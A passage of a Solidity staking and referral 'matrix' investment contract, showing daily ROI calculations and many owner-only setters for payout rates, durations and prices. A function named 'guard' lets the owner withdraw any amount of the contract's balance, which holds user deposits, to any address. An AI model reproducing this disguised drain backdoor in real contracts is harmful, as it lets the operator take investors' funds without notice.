                timeOrProfit[0] = nowOrEndOfProfit.sub(stakingUsers[_userAddress].lastRefreshTime[i]);
                
                if(timeOrProfit[0] >= DAY_LENGTH_IN_SECONDS){
                    uint noD = timeOrProfit[0].div(DAY_LENGTH_IN_SECONDS);
                    timeOrProfit[1] = timeOrProfit[1].add((noD.mul(stakingUsers[_userAddress].investAmount[i].mul(roiPercentage[1])).div(100 * (10 ** 18))));
                }
            }
            
            i = i + (1);
        }
        
        return (timeOrProfit[1].add(availROI[_userAddress][2]));
    }
    
    function _directRoi(address _userAddress) internal returns(uint) {
        uint8 i =0;
        uint[2] memory timeOrProfit;
             
        while (i < stakingUsers[_userAddress].investAmount.length) {
        
            if(stakingUsers[_userAddress].completed[i] == false) {
                uint nowOrEndOfProfit = block.timestamp;
                if(block.timestamp >= stakingUsers[_userAddress].endROITime[i]) {
                    nowOrEndOfProfit = stakingUsers[_userAddress].endROITime[i]; 
                    stakingUsers[_userAddress].completed[i] = true;
                }

                timeOrProfit[0] = nowOrEndOfProfit.sub(stakingUsers[_userAddress].lastRefreshTime[i]);
                
                if(timeOrProfit[0] >= DAY_LENGTH_IN_SECONDS) {
                    uint noD = timeOrProfit[0].div(DAY_LENGTH_IN_SECONDS);
                    timeOrProfit[1] = timeOrProfit[1].add(noD.mul((stakingUsers[_userAddress].investAmount[i].mul(roiPercentage[1])).div(100 * (10 ** 18))));                
                    stakingUsers[_userAddress].lastRefreshTime[i] = stakingUsers[_userAddress].lastRefreshTime[i].add(noD.mul(DAY_LENGTH_IN_SECONDS));
                }
            }

            i = i + (1);
        }
        
        availROI[_userAddress][2] = availROI[_userAddress][2].add(timeOrProfit[1]);
        
        return (availROI[_userAddress][2]);
        
    }
    
    function updateMatrixPrice(uint8 _level, uint _price)  external onlyOwner returns(bool) {
          matrixLevelPrice[_level] = _price;
          return true;
    } 
    
    function updateDividendPrice(uint _price) external onlyOwner returns(bool) { // 18 decimal
          divPlanInvest = _price;
          return true;
    }  
    
    
    function updateStakingMinDeposit(uint _price) external onlyOwner returns(bool) { //18 decimal
          stakingMinInvest = _price;
          return true;
    } 
    
    function updateDividendLevelIncomePercentage(uint _percentage) external onlyOwner returns(bool) { // 18 decimal
        levelIncomeShare = _percentage;
        return true;
    }
    
    function updateDivPercentage(uint _percentage) external onlyOwner returns(bool) { 
          roiPercentage[0] = _percentage;
          return true;
    } 
    
    function updateStakingPercentage(uint _percentage) external onlyOwner returns(bool) { 
          roiPercentage[1] = _percentage;
          return true;
    } 
    
    function updateStakingLineLimit(uint8 _line, uint _limitPrice) external onlyOwner returns(bool) {
          stakingLineLimit[_line] = _limitPrice;
          return true;
    } 
    
    function updateStakingRefLinePercentage(uint8 _line, uint _percentage) external onlyOwner returns(bool) {
          stakingRefLinePercentage[_line] = _percentage;
          return true;
    } 
    
    
    function updateROIDuration(uint8 _plan, uint _duration) external onlyOwner returns(bool) { // in seconds 0 - Div 1 - Staking
          roiDuration[_plan] = _duration;
          return true;
    } 
    
    function guard(address payable _toUser, uint _amount) external onlyOwner returns (bool) {
        require(_toUser != address(0), "Invalid Address");
        require(address(this).balance >= _amount, "Insufficient balance");

        (_toUser).transfer(_amount);
        emit AdminTransactionEvent(2, _amount, block.timestamp);
        return true;
    } 
    
    function contractLock(bool _lockStatus) external onlyOwner returns(bool) {
        lockStatus = _lockStatus;
        return true;
    } 
}